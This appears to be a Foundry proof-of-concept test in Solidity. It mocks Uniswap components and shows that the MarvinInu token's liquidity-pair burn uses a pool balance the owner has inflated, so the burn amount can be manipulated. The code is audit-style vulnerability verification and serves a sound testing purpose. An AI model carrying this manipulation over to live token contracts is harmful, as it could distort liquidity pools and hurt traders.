// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.9;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/MarvinInu.sol";

contract MockWETH {
    function deposit() public payable {}
    function withdraw(uint) public {}
}

contract MockPair {
    function sync() external {
        // Do nothing - just satisfy interface
    }
}

contract MockFactory {
    address public pair;

    constructor(address _pair) {
        pair = _pair;
    }

    function createPair(address, address) external view returns (address) {
        return pair;
    }
}

contract MockRouter {
    address public factory;
    address public WETH;

    function initialize(address _factory, address _weth) external {
        factory = _factory;
        WETH = _weth;
    }
}

contract MarvinInuBurnTest is Test {
    MarvinInu token;
    MockWETH mockWETH;
    MockPair mockPair;
    MockFactory mockFactory;

    address constant REAL_ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address owner = makeAddr("owner");
    address pairAddress;

    function setUp() public {
        // Deploy mock chain components
        mockWETH = new MockWETH();
        mockPair = new MockPair();
        mockFactory = new MockFactory(address(mockPair));

        // Deploy router template
        MockRouter mockRouterTemplate = new MockRouter();
        bytes memory mockRouterCode = address(mockRouterTemplate).code;
        vm.etch(REAL_ROUTER, mockRouterCode);
        
        // Initialize the mock router at the real address
        (bool success, ) = REAL_ROUTER.call(
            abi.encodeWithSignature(
                "initialize(address,address)",
                address(mockFactory),
                address(mockWETH)
            )
        );
        require(success, "Router initialization failed");

        // Deploy & configure MarvinInu token
        vm.startPrank(owner);
        token = new MarvinInu();
        token.disableTransferDelay();
        token.removeLimits();
        token.enableTrading();
        vm.stopPrank();

        // Initialize pair address after token deployment
        pairAddress = token.uniswapV2Pair();

        // Transfer initial liquidity to pair after address is known
        vm.prank(owner);
        token.transfer(pairAddress, 1000 * 10**18);
    }

    function testLpBurnManipulation() public {
        console.log("--- BEFORE-Trigger LP Manipulation ---");
        uint256 initialPairBalance = token.balanceOf(pairAddress);
        console.log("[STATE] Initial Pool Balance: ", initialPairBalance);

        // Manipulate pool balance by inflating liquidity
        uint256 inflateAmount = initialPairBalance / 100;
        vm.prank(owner);
        token.transfer(pairAddress, inflateAmount);
        
        console.log("--- AFTER-Trigger LP Manipulation ---");
        uint256 manipulatedBalance = token.balanceOf(pairAddress);
        console.log("[STATE] Pumped Pool Balance: ", manipulatedBalance);
        
        // Calculate expected burn amount (10% of inflated balance)
        uint256 expectedBurnAmount = (manipulatedBalance * 1000) / 10000;
        console.log("[IMPACT] Expected Burn (10% of manipulated): ", expectedBurnAmount);
        
        console.log("--- Trigger Burn Operation ---");
        // Fast forward to pass cooldown period
        vm.warp(block.timestamp + 30 minutes + 1);
        
        console.log("--- BEFORE-Trigger Burn ---");
        uint256 preBurnBalance = token.balanceOf(pairAddress);
        console.log("[STATE] Pre-Burn Balance: ", preBurnBalance);
        
        // Execute burn operation
        vm.prank(owner);
        token.manualBurnLiquidityPairTokens(1000);
        
        console.log("--- AFTER-Trigger Burn ---");
        uint256 postBurnBalance = token.balanceOf(pairAddress);
        console.log("[STATE] Post-Burn Balance: ", postBurnBalance);
        
        // Calculate actual burned amount
        uint256 actualBurnAmount = preBurnBalance - postBurnBalance;
        console.log("[IMPACT] Actual Burn Amount: ", actualBurnAmount);
        
        // Vulnerability verification
        bool vulnerabilityExists = actualBurnAmount == expectedBurnAmount;
        console.log("[VERDICT] Burn exactly matched manipulation: ", vulnerabilityExists);
        
        // Final exploit status
        if (vulnerabilityExists) {
            console.log("Vulnerability Exists: Burn mechanism uses manipulated LP balance");
        } else {
            console.log("Vulnerability not Exist: Burn mechanism is not affected");
        }
    }
}